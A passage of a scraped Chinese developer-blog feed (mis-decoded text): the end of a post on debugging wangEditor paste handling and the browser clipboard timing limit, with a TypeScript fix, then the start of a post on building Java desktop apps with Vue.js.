<p>æ­¤æ—¶å°±é”å®šé—®é¢˜äº†ï¼šwangEditor åœ¨å…¶ä½™é€»è¾‘æ²¡æœ‰ä¸­æ–­å¤„ç†æ—¶ï¼Œæœ€ç»ˆçš„ insertData é‡Œé¢ä¼šè·å– DataTransfer é‡Œé¢çš„ text å’Œ htmlï¼Œhtml æ˜¯é«˜ä¼˜å…ˆçº§ï¼Œå½“ html æœ‰å†…å®¹æ—¶ï¼Œå°±ä¼šæ‰§è¡Œå†…éƒ¨çš„ <code>dangerouslyInsertHtml</code> æ–¹æ³•ï¼Œå†…éƒ¨çš„å®ç°å°±æ˜¯ä¼šæŠŠå¯Œæ–‡æœ¬è½¬æ¢ä¸º slatejs çš„èŠ‚ç‚¹ï¼Œç„¶åæ’å…¥åˆ°è¡¨æ ¼ä¸‹é¢ã€‚è€Œå½“ html æ²¡æœ‰å†…å®¹æ—¶ï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„ if (text) å—ï¼Œæœ€ç»ˆæ‰§è¡Œçš„æ˜¯ <code>insertText</code> æ–¹æ³•ï¼Œå†…éƒ¨å¤„ç†å°±æ˜¯éå¸¸ç®€å•çš„æ’å…¥æ–‡æœ¬ï¼Œæ‰€ä»¥ç²˜è´´å†…å®¹æ‰ä¼šå‡ºç°åœ¨å¯Œæ–‡æœ¬æ¨¡å—ä¸‹é¢ï¼Œå¹¶ä¸”æ ‡é¢˜çš„æ ·å¼æ²¡äº†ã€‚</p>
<h2 data-id="heading-3">å‘ç°ä¸»è¦é—®é¢˜</h2>
<p>ä¸ºä»€ä¹ˆåœ¨æ‰“äº†å¤šä¸ªæ–­ç‚¹åï¼ŒgetData("text/html") çš„å€¼ä¼šä¸ä¸€æ ·ï¼Ÿ</p>
<ul>
<li>
<p>å¤šä¸ªæ–­ç‚¹æˆªå›¾ï¼Œhtml æ‹¿åˆ°çš„æ˜¯ç©ºå­—ç¬¦ä¸²
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9670edd50b44c568107b9782984fcd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=9MXmb3q9CHAR87ivHmDgw1ZjBew%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p>å•ä¸ªæ–­ç‚¹æˆªå›¾ï¼Œhtmlæ‹¿åˆ°äº†å¯Œæ–‡æœ¬å€¼
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/355e993dd2c54f2a87090ec71c1b8274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=6CEJHGdNtuBanEo%2BN6LYEkeeiJQ%3D" alt="image.png" loading="lazy"/></p>
</li>
</ul>
<h2 data-id="heading-4">å°è¯•ç†è§£åŸç†</h2>
<p>é‡äº‹ä¸å†³æ‰¾ AIï¼Œäºæ˜¯é—®äº†ä¸‹ Geminiï¼Œå¾—åˆ°ä»¥ä¸‹å›ç­”
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/251c834539a140718595ab7414f84b47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=F%2B%2FUY4MQ4z3hFSy1ILKTYqgE0wg%3D" alt="image.png" loading="lazy"/>
æ’å¥é¢˜å¤–è¯ï¼Œè¿™é‡Œä¸å¾—ä¸åæ§½ä¸€ä¸‹ï¼Œåˆšåˆšçœ‹å®Œã€Šç»å‘½æ¯’å¸ˆã€‹è¿é‡åˆ°ä¸ªé—®é¢˜éƒ½å’Œæµ·æ£®å ¡æœ‰å…³ï¼Œäºæ˜¯æ»¡è„‘å­çš„â€œsay my nameâ€ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bd9f6df6a8441149cf5501f2d73f840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=LYJ6sQDbKCZumB2YqOdNYmyjv1Q%3D" alt="image.png" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/190faad0940b494bbf04bb2cd32a0260~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=kYei5wWBXtf8FgK%2B1FjgPRhKmac%3D" alt="image.png" loading="lazy"/></p>
<p>ç»†é—®ä¹‹ä¸‹ï¼Œå¾—åˆ°ä»¥ä¸‹ç»“æœ
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be3f8d5dcc944cb4b1bf4f5fd80ea61d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=ZVdtV8BoUcGLslcRghIFQ2%2F2Sac%3D" alt="image.png" loading="lazy"/>
ç®€è€Œè¨€ä¹‹å°±æ˜¯æµè§ˆå™¨åœ¨æ‰“æ–­ç‚¹æœŸé—´ï¼Œè¿™ä¸ªå®‰å…¨è®¡æ—¶å¹¶æœªæš‚åœï¼Œäºæ˜¯ç­‰æˆ‘å¤„ç†å®Œä¸Šé¢çš„æ–­ç‚¹ï¼Œèµ°åˆ° <code>getData("text/html")</code> æ—¶ï¼Œå®‰å…¨è®¡æ—¶è¶…æ—¶äº†ä¹Ÿå°±æ‹¿åˆ°äº†ç©ºçš„å†…å®¹ã€‚</p>
<p><strong>é‚£ä¸ºä»€ä¹ˆ <code>getData("text/plain")</code> è¿˜æ˜¯å¯ä»¥æ‹¿åˆ°å€¼ï¼Ÿ</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c2893557118482ca890a28d534e416e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=fA%2BgH1NBWQf84B%2BVmUDCzEoI%2Fgk%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆ text/plain æœ‰å€¼è€Œ text/html æ²¡æœ‰å€¼ã€‚</p>
<h2 data-id="heading-5">å¦‚ä½•è§£å†³</h2>
<p>é—®é¢˜æ‰¾åˆ°äº†ï¼Œé‚£å¦‚ä½•è§£å†³ã€‚å¦‚æœæˆ‘éè¦åœ¨æ–­ç‚¹åä¹Ÿèƒ½æ‹¿åˆ° html çš„æ•°æ®ï¼Œæœ‰æ²¡æœ‰åŠæ³•ï¼Œè¿™ä¸ªå®‰å…¨è®¡æ—¶çš„æœ€å¤§æ—¶é—´åˆæ˜¯å¤šå°‘ï¼Ÿ</p>
<p>æ ¹æ®æˆ‘çš„ç®€å•è¯•é”™ï¼Œè¿™ä¸ªå®‰å…¨è®¡æ—¶å¤§æ¦‚æ˜¯5ç§’å·¦å³ã€‚å½“æ‰‹é€Ÿå¿«ä¸€ç‚¹çš„æƒ…å†µä¸‹ï¼Œä»æ‰§è¡Œäº‹ä»¶åˆ° text/html è¿™ä¸€æ­¥åœ¨5ç§’å†…æ—¶ï¼Œå¤šä¸ªæ–­ç‚¹ä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°æ•°æ®çš„ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a24ba3dc5ad84de09a9d7064beb7002d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=pJw50rjV8ji00xlg%2FzfnXldcqeg%3D" alt="image.png" loading="lazy"/></p>
<p>é‚£ä¹ˆé—®é¢˜åˆåŒå’å•æ¥äº†ï¼Œ<strong>æœ‰æ²¡æœ‰è¶…è¿‡5ç§’ä¹Ÿå¯ä»¥æ‹¿åˆ°æ•°æ®çš„æ–¹æ³•å‘¢ï¼Ÿ</strong>ï¼Œæœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„ã€‚</p>
<p>å½“ä½ æ‰‹é€Ÿä¸å¤Ÿå¿«ï¼Œåˆæƒ³ä¸€æ­¥ä¸€æ­¥æ…¢æ…¢è°ƒçš„æ—¶å€™ï¼Œå°±å»ç½‘ç«™è®¾ç½®é‡Œé¢æŠŠå‰ªè´´æ–¯æƒé™ç”±è¯¢é—®æ”¹æˆå…è®¸ã€‚å°±å¯ä»¥ä¸€æ­¥ä¸€æ­¥F10æ…¢æ…¢è°ƒäº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c14d2bc05b74fe791ef80f72035dd9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=0uc%2F%2FrbEn5M%2BOG8f5Q%2FpIzrDTi4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8bba8fb51034382aad2a7e9473930ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=ZF%2BXAAQErbNAXjXxCC867tiJNZg%3D" alt="image.png" loading="lazy"/></p>
<p>çœ‹çœ‹æ•ˆæœ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e35db44cb2d4c5c9548421421b5c277~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=4w1fMaO%2BkcpyYgY0zFDAY8ZooWM%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ç¬¬105è¡Œæ·»åŠ ä¸€ä¸ªæ—¥å¿—æ–­ç‚¹ <code>console.time("html")</code>ï¼Œç„¶ååœ¨106è¡ŒåŠ ä¸€ä¸ªæ–­ç‚¹ç”¨æ¥ç­‰ä¸‹å¡ä½ï¼Œç­‰è¿‡10ç§’å†ä¸‹ä¸€æ­¥ï¼Œç„¶ååœ¨114è¡Œæ·»åŠ æ—¥å¿—æ–­ç‚¹ <code>console.timeEnd("html")</code>ï¼Œå†åœ¨117è¡Œå¡ä½ï¼Œå°±å¯ä»¥çœ‹åˆ° html è¿˜å¯ä»¥æ‹¿åˆ°å€¼äº†ã€‚è€Œæ§åˆ¶å°ä¹Ÿæ˜¾ç¤ºäº†ä¸­é€”å¡äº†11ç§’ï¼Œè¿™å·²ç»è¶…è¿‡äº†5ç§’çš„å®‰å…¨è®¡æ—¶ï¼Œä½†ä¾ç„¶å¯ä»¥æ‹¿åˆ°å€¼ã€‚</p>
<h2 data-id="heading-6">å°ç»“</h2>
<p>å…³äºè¿™ä¸ªé—®é¢˜ï¼Œç”±äºæ¯”è¾ƒæ‡’ï¼Œæ²¡æœ‰å»ç ”ç©¶åœ¨ä¸åŒçš„æµè§ˆå™¨ä¸Šæ˜¯å¦éƒ½ä¼šæœ‰è¿™ä¸ªå®‰å…¨æœºåˆ¶ï¼Œæˆ–è€…ä¸åŒçš„æµè§ˆå™¨çš„å®‰å…¨é™æ—¶æ˜¯å¦æ˜¯ä¸€æ ·çš„ï¼Œæˆ–è€…è®¾ç½®äº†å‰ªè´´æ¿ä¸ºå…è®¸åçš„è¡ŒåŠ¨é€»è¾‘æ˜¯å¦ä¸€æ ·ã€‚é€šè¿‡æ‹–æ‹½äº§ç”Ÿçš„DataTransferæ˜¯å¦ä¹Ÿæœ‰è¿™ä¸ªé™åˆ¶ï¼Œè¿™ä¸ªé™åˆ¶æ˜¯åœ¨æµè§ˆå™¨å±‚é¢çš„ï¼Œè¿˜æ˜¯åœ¨ ECMAScript é‡Œé¢è§„å®šçš„ç­‰ç­‰ã€‚åˆæˆ–è€…å¦‚æœä¸æ˜¯å› ä¸ºæ–­ç‚¹ï¼Œè€Œæ˜¯å› ä¸ºä¸­é€”å¤„ç†é€»è¾‘å°±æ˜¯è¶…è¿‡äº†5ç§’ï¼Œé‚£æ˜¯å¦è¿˜èƒ½æ‹¿å¾—åˆ°ã€‚åç»­æœ‰æœºä¼šçš„è¯å†è¿›è¡Œè¡¥å……ã€‚</p>
<h2 data-id="heading-7">æ€»ç»“</h2>
<ol>
<li>åœ¨ devtools é‡Œé¢ï¼Œå¦‚æœå› ä¸ºæ–­ç‚¹å¯¼è‡´ä»äº¤äº’äº‹ä»¶åˆ° getData("text/html") çš„æ—¶é—´è¶…è¿‡5ç§’ï¼Œé‚£ä¹ˆå°±ä¼šæ‹¿åˆ°ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚</li>
<li>getData("text/plain") ä¸å—æ­¤é™åˆ¶ï¼Œè¶…è¿‡5ç§’ä¹Ÿå¯ä»¥æ‹¿åˆ°å€¼ã€‚</li>
<li>å¼€å‘æ—¶é€šè¿‡å°†ç½‘é¡µçš„å‰ªè´´æ¿æƒé™æ”¹æˆâ€œå…è®¸â€å°±å¯ä»¥çªç ´è¿™ä¸ªå®‰å…¨è®¡æ—¶é™åˆ¶ã€‚</li>
</ol>
<h2 data-id="heading-8">BUG æ”¹äº†å—ï¼Ÿï¼ˆä¸æœ¬è´´å†…å®¹æ— å…³ï¼‰</h2>
<p>æ”¹äº†ï¼Œæ”¹äº†ã€‚éå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨å¯Œæ–‡æœ¬æ¨¡å—é‡å†™ insertData æ–¹æ³•ï¼Œå¦‚æœäº‹ä»¶æ‰§è¡Œæ—¶åœ¨å¯Œæ–‡æœ¬æ¨¡å—ä¸­ï¼Œå°±è·å– htmlï¼Œç„¶åè½¬æ¢æˆ slate èŠ‚ç‚¹ï¼Œå†æŠŠå¯Œæ–‡æœ¬æ¨¡å—æ•´ä¸ªæ›¿æ¢æ‰å°±å¯ä»¥äº†ã€‚å®ç°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">  newEditor.<span class="hljs-property">insertData</span> = <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> richTextEntry = <span class="hljs-title class_">SlateEditor</span>.<span class="hljs-property">above</span>&lt;<span class="hljs-title class_">RichTextElement</span>&gt;(newEditor, {
      <span class="hljs-attr">match</span>: <span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> <span class="hljs-title class_">DomEditor</span>.<span class="hljs-title function_">checkNodeType</span>(n, richTextModuleType),
      <span class="hljs-attr">mode</span>: <span class="hljs-string">'highest'</span>,
    })

    <span class="hljs-keyword">if</span> (!richTextEntry) {
      <span class="hljs-title function_">insertData</span>(data)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-keyword">const</span> html = data.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'text/html'</span>)

    <span class="hljs-keyword">if</span> (html) {
      <span class="hljs-keyword">const</span> fragment = <span class="hljs-title function_">htmlToContent</span>(editor, html)
      <span class="hljs-title class_">SlateTransforms</span>.<span class="hljs-title function_">insertNodes</span>(newEditor, fragment)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-title function_">insertData</span>(data)
  }
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼Œæ ‡é¢˜çš„æ ·å¼ä¹Ÿå¾—åˆ°äº†ä¿ç•™ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36eebc1ad2ea4f9a8b25541b75c3a538~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=Nv5lZc0mI3%2BaJJLovtI7ZZD6Oag%3D" alt="image.png" loading="lazy"/></p>
<p>è¡¨å•æ¨¡å—ä¹Ÿæ‹¿åˆ°äº†å¯Œæ–‡æœ¬çš„å†…å®¹ï¼Œä¸šåŠ¡ç³»ç»Ÿå°±å¯ä»¥æ ¹æ®ç¼–è¾‘å™¨å®ä¾‹è·å–åˆ°æ¨¡ç‰ˆçš„ç»“æ„åŒ–å€¼äº†ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e11c65a6931479e876fc8ecd6225a13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=O39Kfm%2F4vPCMalgx9JshS7Ds7Mw%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨ Vue.js æ„å»º Java æ¡Œé¢åº”ç”¨]]></title>    <link>https://juejin.cn/post/7589126217250455593</link>    <guid>https://juejin.cn/post/7589126217250455593</guid>    <pubDate>2025-12-29T11:31:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217250455593" data-draft-id="7589082912588693547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨ Vue.js æ„å»º Java æ¡Œé¢åº”ç”¨"/> <meta itemprop="keywords" content="Vue.js,Java,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T11:31:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TeamDev"/> <meta itemprop="url" content="https://juejin.cn/user/4158825167847872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨ Vue.js æ„å»º Java æ¡Œé¢åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4158825167847872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TeamDev
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T11:31:02.000Z" title="Mon Dec 29 2025 11:31:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e2563112fd5454b96d6f081bda447f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGVhbURldg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767612662&amp;x-signature=8nglmSr9qmh0paZQSBLa9Lictvw%3D" alt="" loading="lazy"/></p>
<p>å¦‚ä»Šï¼Œè¶Šæ¥è¶Šå¤šçš„æ¡Œé¢åº”ç”¨å¼€å§‹é‡‡ç”¨ Web åŒ–ç•Œé¢è®¾è®¡ã€‚è¿™ç§æ–¹æ³•å®Œç¾ç»“åˆäº† Web æŠ€æœ¯çš„çµæ´»æ€§ä¸åŸç”Ÿåº”ç”¨çš„æ€§èƒ½ä¼˜åŠ¿åŠç³»ç»Ÿé›†æˆèƒ½åŠ›ï¼Œæˆä¸ºæ¡Œé¢å¼€å‘çš„ä¸»æµè¶‹åŠ¿ã€‚</p>
<p>æœ¬æ–‡ä»‹ç»çš„ Java æ¡Œé¢åº”ç”¨æ­£æ˜¯åŸºäºè¿™ä¸€ç°ä»£æ¶æ„ï¼šé€šè¿‡ Vue.js ä¸ Tailwind CSS æ„å»º Web ç•Œé¢ï¼Œå®ç°äº†è·¨å¹³å°ä¸€è‡´ã€æµç•…å“åº”ä¸”è®¾è®¡ç²¾ç¾çš„ç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-0">Web UI å¯¹æ¯”åŸç”Ÿ UI</h2>
<p>ä¼ ç»Ÿæ¡Œé¢åº”ç”¨çš„åŸç”Ÿ UI å·¥å…·åŒ…é•¿æœŸéš¾ä»¥æ»¡è¶³ç°ä»£ UI éœ€æ±‚ â€”â€” è¦å®ç°ç²¾è‡´çš„è§†è§‰æ•ˆæœã€æµç•…çš„åŠ¨ç”»è¿‡æ¸¡ã€é«˜ DPI å±å¹•é€‚é…ï¼Œæˆ–æ˜¯åƒ Web åº”ç”¨é‚£æ ·çµæ´»åˆ‡æ¢ä¸»é¢˜ï¼ˆäº®è‰² / æš—è‰²æ¨¡å¼ã€è‡ªå®šä¹‰é…è‰²ç­‰ï¼‰ï¼Œå¾€å¾€éœ€è¦å¤§é‡å®šåˆ¶å¼€å‘å·¥ä½œã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼ŒåŸºäº Web çš„ç”¨æˆ·ç•Œé¢å—ç›Šäºåºå¤§çš„ç”Ÿæ€ç³»ç»Ÿï¼Œå…¶ä¸­åŒ…å«ç°æˆçš„åº“ã€ç»„ä»¶æ¡†æ¶ã€å“åº”å¼è®¾è®¡ï¼Œä»¥åŠè·¨æ“ä½œç³»ç»Ÿå’Œè®¾å¤‡å½¢æ€çš„ä¸€è‡´æ€§ã€‚</p>
<p>é€šè¿‡åœ¨æ¡Œé¢å¤–å£³ä¸­åµŒå…¥ Web UIï¼Œæˆ‘ä»¬æ—¢èƒ½ä½¿ç”¨ç°ä»£ Web é£æ ¼çš„ç•Œé¢ï¼Œåˆèƒ½åˆ©ç”¨åŸç”Ÿåº”ç”¨çš„èƒ½åŠ›ã€‚çº¯ Web åº”ç”¨ç”±äºç¼ºä¹å®Œå…¨çš„æ–‡ä»¶ç³»ç»Ÿè®¿é—®ã€OS API å’Œç¦»çº¿èƒ½åŠ›ï¼Œå¾ˆéš¾å®Œå…¨æ›¿ä»£æ¡Œé¢åº”ç”¨ï¼›è€Œåœ¨åŸç”ŸåŒ…è£…ä¸­è¿è¡Œ Web UI åˆ™å¼¥è¡¥äº†è¿™äº›ä¸è¶³ï¼Œå®ç°ä¸¤è€…çš„æœ€ä½³ç»„åˆã€‚</p>
<h2 data-id="heading-1">åº”ç”¨æ¦‚è§ˆ</h2>
<p>è¯¥åº”ç”¨æ˜¯ä¸€æ¬¾è·¨å¹³å° Java æ¡Œé¢åº”ç”¨ç¨‹åºï¼Œæ ¸å¿ƒæ¶æ„æ˜¯åœ¨åŸç”Ÿ Java çª—å£ä¸­é›†æˆç°ä»£åŒ– Vue.js Web ç•Œé¢ï¼Œé€šè¿‡ Shadcn ç»„ä»¶åº“æ„å»ºç®€æ´ç›´è§‚çš„æ“ä½œç•Œé¢ã€‚</p>
<p>è¿™ç§æ¶æ„ç¡®ä¿äº†ä»¥ä¸‹ç‰¹æ€§ï¼š</p>
<ul>
<li>åœ¨ Windowsã€macOSã€Linux ä¸Šç»Ÿä¸€çš„ç•Œé¢å‘ˆç°ã€‚</li>
